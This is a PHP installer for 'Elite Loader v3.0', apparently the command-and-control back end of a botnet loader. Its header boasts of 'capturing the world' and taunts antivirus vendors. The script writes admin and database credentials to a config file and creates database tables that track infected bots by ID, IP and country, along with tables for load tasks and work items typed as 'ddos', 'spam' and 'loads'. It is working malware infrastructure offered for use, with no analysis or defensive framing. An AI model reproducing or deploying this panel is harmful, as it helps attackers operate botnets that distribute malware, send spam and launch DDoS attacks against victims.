<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<head>
    <title>Install EliteLoader</title>
    <meta http-equiv="content-type" content="text/html;charset=windows-1251" />
</head>
<body>
<center>
<?php
#################################################
#             Elite Loader v3.0                 #
#                                               #
#    (c)oded by [PRO]MAKE.ME TeaM :P            #
#                                               #
# To BBC and McAfee:                            #
# Project to capture The World                  #
#                      in the implementation.   #
#                                               #
#            You lose! Who next? :)             #
#                                               #
#################################################
require('config.php');
require('sys/mysql_class.php');

    $db=new db;
    switch($_POST['act']){

        default:
            echo "<div style='border: 1px solid #cccccc;background-color: #eeeeee;font-size: 12px;text-align:left;padding:5px;margin:5px;color: #333333;width: 350px;height: 250px;overflow: scroll;float: left;'>"; flush();
            if(file_exists('config.php')){ echo "[+] File config.php exists!"; }else{ echo "[-] File config.php not exists!"; } echo "<br />"; flush();
            if(is_writable('config.php')){ echo "[+] File config.php writable!"; }else{ echo "[-] File config.php not writable!"; } echo "<br />"; flush();
            if($db->connect(DB_USER,DB_PASS,DB_NAME)){ echo "[+] Database connected!"; $db->close(); }else{ echo "[-] Do not connect to database!"; } echo "<br />"; flush();
            echo '</div><br /><form action="" method="POST">
              <table border="0">
                <tr>
                  <td colspan="2"><h3>Elite Loader</h3></td>
                </tr>
                <tr>
                  <td>Admin Login:</td>
                  <td><input type="text" name="LOGIN" size="25"></td>
                </tr>
                <tr>
                  <td>Admin Password:</td>
                  <td><input type="text" name="PASS" size="25"></td>
                </tr>
                <tr>
                  <td>Database User:</td>
                  <td><input type="text" name="DB_USER" size="25"></td>
                </tr>
                <tr>
                  <td>Database Password:</td>
                  <td><input type="text" name="DB_PASS" size="25"></td>
                </tr>
                <tr>
                  <td>Database Name:</td>
                  <td><input type="text" name="DB_NAME" size="25"></td>
                </tr>
                <tr>
                  <td>Tables Prefix (prefix_tablename):</td>
                  <td><input type="text" name="DB_PREFIX" value="chimera" size="25"></td>
                </tr>
                <tr>
                  <td colspan="2"><input type="hidden" name="act" value="config"><input type="submit" value="Install"></td>
                </tr>
              </table></form>';
        break;

        case 'config':
            echo "<div style='border: 1px solid #cccccc;background-color: #eeeeee;font-size: 12px;text-align:left;padding:5px;margin:5px;color: #333333;width: 350px;height: 250px;overflow: scroll;float: left;'>"; flush();
            if(file_exists('config.php')){ echo "[+] File config.php exists!"; }else{ echo "[-] File config.php not exists!"; die("<br />Fixed and reload page!"); } echo "<br />"; flush();
            if(is_writable('config.php')){ echo "[+] File config.php writable!"; }else{ echo "[-] File config.php not writable!"; die("<br />Fixed and reload page!"); } echo "<br />"; flush();
            if($db->connect($db->safesql($_POST['DB_USER']),$db->safesql($_POST['DB_PASS']),$db->safesql($_POST['DB_NAME']))){ echo "[+] Database connected!"; }else{ echo "[-] Do not connect to database!"; die("<br />Fixed and reload page!"); } echo "<br />"; flush();
            $f = fopen('config.php','w');
            fwrite($f,"<?php\n# Admin Login\ndefine('ROOT_LOGIN','".$db->safesql($_POST['LOGIN'])."');\n# Admin Password\ndefine('ROOT_PASSW','".$db->safesql($_POST['PASS'])."');\n# Language ru, en, de\ndefine('LANGUAGE', 'en');\ndefine('DB_USER','".$db->safesql($_POST['DB_USER'])."');\ndefine('DB_PASS','".$db->safesql($_POST['DB_PASS'])."');\ndefine('DB_NAME','".$db->safesql($_POST['DB_NAME'])."');\ndefine('PREFIX','".$db->safesql($_POST['DB_PREFIX'])."');\n?>");
            fclose($f);
            echo "config.php - created!<br />"; flush();
            $f = fopen('load/ver.txt','w');
            fwrite($f,"2:".time());
            fclose($f);
            echo "ver.txt - created!<br />"; flush();
            echo '</div><br /><form action="" method="POST">
              <table border="0">
                <tr>
                  <td><h3>Elite Loader</h3></td>
                </tr>
                <tr>
                  <td>Delete old tables? <input type="checkbox" name="delete" value="1"></td>
                </tr>
                <tr>
                  <td><input type="hidden" name="act" value="install"><input type="submit" value="Next"></td>
                </tr>
              </table></form>';

        break;

        case 'install':
            echo "<div style='border: 1px solid #cccccc;background-color: #eeeeee;font-size: 12px;text-align:left;padding:5px;margin:5px;color: #333333;width: 350px;height: 250px;overflow: scroll;float: left;'>"; flush();
            if(file_exists('config.php')){ echo "[+] File config.php exists!"; }else{ echo "[-] File config.php not exists!"; die("<br />Fixed and reload page!"); } echo "<br />"; flush();
            if($db->connect(DB_USER,DB_PASS,DB_NAME)){ echo "[+] Database connected!"; }else{ echo "[-] Do not connect to database!"; die("<br />Fixed and reload page!"); } echo "<br />"; flush();

            if($_POST['delete']){
              $db->query("DROP TABLE IF EXISTS `".PREFIX."_bots`;");
              echo "- DROP TABLE IF EXISTS `".PREFIX."_bots`<br />"; flush();
            }

            $sql = "CREATE TABLE `".PREFIX."_bots` (
                `id` int(12) NOT NULL auto_increment,
                `uid` varchar(250) collate cp1251_general_cs NOT NULL default '',
                `country` char(2) collate cp1251_general_cs NOT NULL default '00',
                `ip` varchar(50) collate cp1251_general_cs NOT NULL default '',
                `ver` varchar(50) NOT NULL default '1 0000000000',
                `regtime` timestamp NOT NULL default '0000-00-00 00:00:00',
                `lasttime` timestamp NOT NULL default '0000-00-00 00:00:00' on update CURRENT_TIMESTAMP,
                PRIMARY KEY  (`id`),
                UNIQUE KEY `uid` (`uid`),
                KEY `country` (`country`,`regtime`,`lasttime`)
              ) ENGINE=MyISAM DEFAULT CHARSET=cp1251 COLLATE=cp1251_general_cs;";
            $db->query($sql);
            echo "- CREATE TABLE `".PREFIX."_bots`<br />"; flush();

            if($_POST['delete']){
              $db->query("DROP TABLE IF EXISTS `".PREFIX."_loads`;");
              echo "- DROP TABLE IF EXISTS `".PREFIX."_loads`<br />"; flush();
            }

            $sql = "CREATE TABLE `".PREFIX."_tasks_loads` (
                `id` int(15) NOT NULL auto_increment,
                `name` varchar(20) NOT NULL default 'none',
                `limit` int(11) NOT NULL default '0',
                `rules` text NOT NULL,
                `file` varchar(255) NOT NULL default '',
                `referer` varchar(255) NOT NULL default '',
                `status` enum('0','1') NOT NULL default '0',
                PRIMARY KEY  (`id`),
                UNIQUE KEY `name` (`name`),
                UNIQUE KEY `file` (`file`)
              ) ENGINE=MyISAM DEFAULT CHARSET=cp1251;";
            $db->query($sql);
            echo "- CREATE TABLE `".PREFIX."_tasks_loads`<br />"; flush();

            if($_POST['delete']){
              $db->query("DROP TABLE IF EXISTS `".PREFIX."_work`;");
              echo "- DROP TABLE IF EXISTS `".PREFIX."_work`<br />"; flush();
            }

            $sql = "CREATE TABLE `".PREFIX."_work` (
                `id` int(12) NOT NULL auto_increment,
                `type` enum('ddos','spam','loads') collate cp1251_general_cs NOT NULL default 'ddos',
                `cid` int(12) NOT NULL default '0',
                `botid` varchar(250) collate cp1251_general_cs NOT NULL default '0',
                PRIMARY KEY  (`id`),
                KEY `cid` (`cid`,`botid`)
              ) ENGINE=MyISAM DEFAULT CHARSET=cp1251 COLLATE=cp1251_general_cs;";
            $db->query($sql);
            echo "- CREATE TABLE `".PREFIX."_work`<br />"; flush();
/*
            echo "Unpack build.tar.bz2 archive..."; flush();
            $bzip2 = new bzip2;
            $bzip2->extractBzip2("./build.tar.bz2", "./");
            echo "Complete!<br />"; flush();
*/
            echo '</div><br />
              <table border="0">
                <tr>
                  <td><h3>Elite Loader</h3></td>
                </tr>
                <tr>
                  <td>Install - Completed!<br /><br />File config.php set perms 0644 and delete on server install.php!</td>
                </tr>
              </table>';

        break;
    }
    $db->close();
?>
</center>
</body>
</html>
